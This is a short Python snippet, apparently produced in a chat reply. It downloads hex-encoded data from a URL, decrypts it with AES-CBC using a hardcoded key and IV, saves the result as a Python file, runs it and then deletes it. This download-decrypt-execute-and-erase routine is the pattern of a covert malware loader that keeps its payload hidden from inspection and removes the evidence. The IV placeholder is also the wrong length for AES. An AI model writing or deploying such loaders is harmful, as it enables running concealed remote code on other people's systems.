RAW_KEY = "quhwc723c3rr3rd3" # Replace with your full Key string
RAW_IV  = "123222332n239fb32f3" # Replace with your full IV string

# Convert UTF8 strings to bytes
AES_KEY = RAW_KEY.encode('utf-8')
AES_IV  = RAW_IV.encode('utf-8')

def download_decrypt_run(url, decrypted_file):
    try:
        # 1. Download the encrypted Hex data
        print(f"Downloading from {url}...")
        response = requests.get(url)
        response.raise_for_status()
        
        # Since your output was "Hex", the downloaded content is likely a hex string.
        # We strip whitespace and convert hex text to actual bytes.
        hex_data = response.text.strip()
        encrypted_bytes = bytes.fromhex(hex_data)

        # 2. Decrypt using CBC mode
        print("Decrypting...")
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
        
        # Decrypt and unpad
        decrypted_data = unpad(cipher.decrypt(encrypted_bytes), AES.block_size)

        # 3. Save the decrypted .py file
        with open(decrypted_file, 'wb') as f:
            f.write(decrypted_data)
        
        # 4. Execute the script
        print(f"Running {decrypted_file}...\n" + "="*30)
        result = subprocess.run([sys.executable, decrypted_file], capture_output=True, text=True)
        
        print("STDOUT:", result.stdout)
        if result.stderr:
            print("STDERR:", result.stderr)

    except ValueError as ve:
        print(f"Decryption failed (Check Key/IV/Padding): {ve}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
    finally:
        # Cleanup
        if os.path.exists(decrypted_file):
            os.remove(decrypted_file)
            print(f"\n[!] {decrypted_file} deleted for security.")

